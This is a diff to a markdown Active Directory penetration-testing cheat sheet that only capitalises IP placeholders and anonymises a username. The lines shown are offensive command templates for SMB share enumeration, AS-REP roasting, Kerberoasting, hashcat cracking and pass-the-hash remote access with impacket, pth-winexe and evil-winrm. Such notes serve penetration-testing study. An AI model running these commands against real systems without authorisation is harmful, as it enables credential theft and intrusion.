@@ -241,7 +241,7 @@ smbmap -H <ip> -u <user>
 
 -> See read permission of given user on smb shares
 ```
-crackmapexec smb <ip> --shares -u <user> -p '<pass>'
+crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```
 
 ### AS-REP Roasting Attack - not require Pre-Authentication
@@ -253,17 +253,17 @@ https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userl
 
 -> GetNPUsers.py - Query ASReproastable accounts from the KDC
 ```
-impacket-GetNPUsers domain.local/ -dc-ip <ip> -usersfile userlist.txt
+impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ```
 
 ### Kerberoast
 -> impacket-GetUserSPNs
 ```
-impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <ip> -request
+impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
 ```
 or  
 ```
-impacket-GetUserSPNs -request -dc-ip <ip> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
+impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
 ```
 
 ```
@@ -274,7 +274,7 @@ hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt
 ```
 or  
 ```
-runas /user:offsec\allison cmd.exe
+runas /user:<hostname>\<user> cmd.exe
 ```
 
 
@@ -282,17 +282,17 @@ runas /user:offsec\allison cmd.exe
 #### Pass the Hash
 -> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
 ```
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<ip> cmd
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
 ```
 
 -> Remote Access - impacket-psexec  
 ```
-impacket-psexec '<hostname>/<user>'@<ip> -hashes ':<hash>'
+impacket-psexec '<hostname>/<user>'@<IP> -hashes ':<hash>'
 ```
 
 -> Remote Access + evil-winrm  
 ```
-evil-winrm -i <ip> -u <user> -H <hash>
+evil-winrm -i <IP> -u <user> -H <hash>
 ```
 
 #### Over Pass the Hash
